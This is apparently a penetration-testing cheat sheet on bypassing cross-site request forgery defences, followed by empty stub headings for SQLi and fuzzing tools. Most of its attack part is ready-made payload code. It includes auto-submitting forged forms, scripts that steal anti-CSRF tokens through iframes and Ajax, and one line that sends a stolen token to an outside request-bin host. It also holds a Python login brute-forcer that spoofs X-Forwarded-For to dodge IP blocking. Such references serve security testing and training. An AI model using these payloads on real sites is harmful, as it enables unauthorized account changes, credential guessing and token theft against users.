Applications might implement a mechanism to validate tokens when they are present. However, a vulnerability arises if the validation is skipped altogether when the token is absent. Attackers can exploit this by removing the parameter that carries the token, not just its value. This allows them to circumvent the validation process and conduct a Cross-Site Request Forgery (CSRF) attack effectively.
CSRF token is not tied to the user session

Applications not tying CSRF tokens to user sessions present a significant security risk. These systems verify tokens against a global pool rather than ensuring each token is bound to the initiating session.

Here's how attackers exploit this:

    Authenticate using their own account.

    Obtain a valid CSRF token from the global pool.

    Use this token in a CSRF attack against a victim.

This vulnerability allows attackers to make unauthorized requests on behalf of the victim, exploiting the application's inadequate token validation mechanism.
Method bypass

If the request is using a "weird" method, check if the method override functionality is working. For example, if it's using a PUT method you can try to use a POST method and send: https://example.com/my/dear/api/val/num?_method=PUT

This could also works sending the _method parameter inside the a POST request or using the headers:

    X-HTTP-Method

    X-HTTP-Method-Override

    X-Method-Override

Custom header token bypass

If the request is adding a custom header with a token to the request as CSRF protection method, then:

    Test the request without the Customized Token and also header.

    Test the request with exact same length but different token.

CSRF token is verified by a cookie

Applications may implement CSRF protection by duplicating the token in both a cookie and a request parameter or by setting a CSRF cookie and verifying if the token sent in the backend corresponds to the cookie. The application validates requests by checking if the token in the request parameter aligns with the value in the cookie.

However, this method is vulnerable to CSRF attacks if the website has flaws allowing an attacker to set a CSRF cookie in the victim's browser, such as a CRLF vulnerability. The attacker can exploit this by loading a deceptive image that sets the cookie, followed by initiating the CSRF attack.

Below is an example of how an attack could be structured:

<html>
  <!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://example.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
  </body>
</html>

Note that if the csrf token is related with the session cookie this attack won't work because you will need to set the victim your session, and therefore you will be attacking yourself.
Content-Type change

According to this, in order to avoid preflight requests using POST method these are the allowed Content-Type values:

    application/x-www-form-urlencoded

    multipart/form-data

    text/plain

However, note that the severs logic may vary depending on the Content-Type used so you should try the values mentioned and others like 
application/json
,
text/xml
, 
application/xml
.

Example (from here) of sending JSON data as text/plain:

<html>
  <body>
    <form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
      <input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
    </form>
    <script>
        form.submit();
    </script>
  </body>
</html>

Bypassing Preflight Requests for JSON Data

When attempting to send JSON data via a POST request, using the Content-Type: application/json in an HTML form is not directly possible. Similarly, utilizing XMLHttpRequest to send this content type initiates a preflight request. Nonetheless, there are strategies to potentially bypass this limitation and check if the server processes the JSON data irrespective of the Content-Type:

    Use Alternative Content Types: Employ Content-Type: text/plain or Content-Type: application/x-www-form-urlencoded by setting enctype="text/plain" in the form. This approach tests if the backend utilizes the data regardless of the Content-Type.

    Modify Content Type: To avoid a preflight request while ensuring the server recognizes the content as JSON, you can send the data with Content-Type: text/plain; application/json. This doesn't trigger a preflight request but might be processed correctly by the server if it's configured to accept application/json.

    SWF Flash File Utilization: A less common but feasible method involves using an SWF flash file to bypass such restrictions. For an in-depth understanding of this technique, refer to this post.

Referrer / Origin check bypass

Avoid Referrer header

Applications may validate the 'Referer' header only when it's present. To prevent a browser from sending this header, the following HTML meta tag can be used:

<meta name="referrer" content="never">

This ensures the 'Referer' header is omitted, potentially bypassing validation checks in some applications.

Regexp bypasses
URL Format Bypass

To set the domain name of the server in the URL that the Referrer is going to send inside the parameters you can do:

<html>
  <!-- Referrer policy needed to send the qury parameter in the referrer -->
  <head><meta name="referrer" content="unsafe-url"></head>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      // You need to set this or the domain won't appear in the query of the referer header
      history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
      document.forms[0].submit();
    </script>
  </body>
</html>

HEAD method bypass

The first part of this CTF writeup is explained that Oak's source code, a router is set to handle HEAD requests as GET requests with no response body - a common workaround that isn't unique to Oak. Instead of a specific handler that deals with HEAD reqs, they're simply given to the GET handler but the app just removes the response body.

Therefore, if a GET request is being limited, you could just send a HEAD request that will be processed as a GET request.
Exploit Examples
Exfiltrating CSRF Token

If a CSRF token is being used as defence you could try to exfiltrate it abusing a XSS vulnerability or a Dangling Markup vulnerability.
GET using HTML tags

<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available

Other HTML5 tags that can be used to automatically send a GET request are:

<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
  body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">

Form GET request

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="GET" action="https://victim.net/email/change-email">
      <input type="hidden" name="email" value="some@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

Form POST request

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="POST" action="https://victim.net/email/change-email" id="csrfform">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
      <input type="submit" value="Submit request" />
      <img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
    </form>
    <script>
      document.forms[0].submit(); //Way 3 to autosubmit
    </script>
  </body>
</html>

Form POST request through iframe

<!-- 
The request is sent through the iframe withuot reloading the page 
-->
<html>
  <body>
  <iframe style="display:none" name="csrfframe"></iframe> 
    <form method="POST" action="/change-email" id="csrfform" target="csrfframe">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

Ajax POST request

<script>
var xh;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xh=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xh=new ActiveXObject("Microsoft.XMLHTTP");
  }
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
  type: "POST",
  url: "https://google.com",
  data: "param=value&param2=value2"
})
</script>

multipart/form-data POST request

myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
    method: "post",
    body: myFormData,
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    mode: "no-cors"
});

multipart/form-data POST request v2

// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);

Form POST request from within an iframe

<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>

Steal CSRF Token and send a POST request

function submitFormWithTokenJS(token) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", POST_URL, true);
    xhr.withCredentials = true;

    // Send the proper header information along with the request
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    // This is for debugging and can be removed
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            //console.log(xhr.responseText);
        }
    }

    xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
    var xhr = new XMLHttpRequest();
    // This tels it to return it as a HTML document
    xhr.responseType = "document";
    xhr.withCredentials = true;
    // true on the end of here makes the call asynchronous
    xhr.open("GET", GET_URL, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            // Get the document from the response
            page = xhr.response
            // Get the input element
            input = page.getElementById("token");
            // Show the token
            //console.log("The token is: " + input.value);
            // Use the token to submit the form
            submitFormWithTokenJS(input.value);
        }
    };
    // Make the request
    xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();

Steal CSRF Token and send a Post request using an iframe, a form and Ajax

<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
    x1=document.getElementById("i1");
    x1d=(x1.contentWindow||x1.contentDocument);
    t=x1d.document.getElementById("token").value;
    
    document.getElementById("token").value=t;
    document.getElementById("form1").submit();
}
</script> 
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>

Steal CSRF Token and sen a POST request using an iframe and a form

<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script> 
function read()
{
    var name = 'admin2';
    var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
    document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
    document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
    document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
    document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
    document.writeln('</form>');
    document.forms[0].submit.click();
}
</script>

Steal token and send it using 2 iframes

<script>
var token;
function readframe1(){
  token = frame1.document.getElementById("profile").token.value;
  document.getElementById("bypass").token.value = token
  loadframe2();
}
function loadframe2(){
  var test = document.getElementbyId("frame2");
  test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
  <input type="text" name="username" value="z">
  <input type="checkbox" name="status" checked="">        
  <input id="token" type="hidden" name="token" value="0000" />
  <button type="submit">Submit</button>
</form>

POSTSteal CSRF token with Ajax and send a post with a form

<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="username" value="root"/>
  <input type="hidden" name="status" value="on"/>
  <input type="hidden" id="findtoken" name="token" value=""/>
  <input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
  x.withCredentials = true;
  x.open("GET","http://google.com?param=VALUE",true);
  x.send(null); 
}
x.onreadystatechange = function() {
  if (x.readyState == XMLHttpRequest.DONE) {
    var token = x.responseText.match(/name="token" value="(.+)"/)[1];
    document.getElementById("findtoken").value = token;
    document.getElementById("form").submit();
  }
}
</script>

CSRF with Socket.IO

<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
    console.log('connected!');
    socket.emit('join', {
        room: username
    });
  socket.emit('my_room_event', {
      data: '!flag',
      room: username
  })

});
</script>

CSRF Login Brute Force

The code can be used to Brut Force a login form using a CSRF token (It's also using the header X-Forwarded-For to try to bypass a possible IP blacklisting):

import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
    #Return CSRF + Session (cookie)
    r = requests.get(URL)
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
    csrf = csrf.group(1)
    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
    return csrf, session_cookie

def login(user, password):
    print(f"{user}:{password}")
    csrf, cookie = init_session()
    cookies = {SESSION_COOKIE_NAME: cookie}
    data = {
        "tokenCSRF": csrf,
        "username": user,
        "password": password,
        "save": ""
    }
    headers = {
        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    }
    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
    if "Username or password incorrect" in r.text:
        return False
    else:
        print(f"FOUND {user} : {password}")
        return True

with open(PASS_LIST, "r") as f:
    for line in f:
        login(USER, line.strip())

Tools

    https://github.com/0xInfection/XSRFProbe

    https://github.com/merttasci/csrf-poc-generator

References

    https://portswigger.net/web-security/csrf

    https://portswigger.net/web-security/csrf/bypassing-token-validation

    https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses

    https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html

​
## SQLi

## ffuf ( bruteforce )

## dirbuster (FUZZ dir.)

## gobuster (FUZZ)
## Permissions 
For Professional Work Flow purposes. Made public to fork.
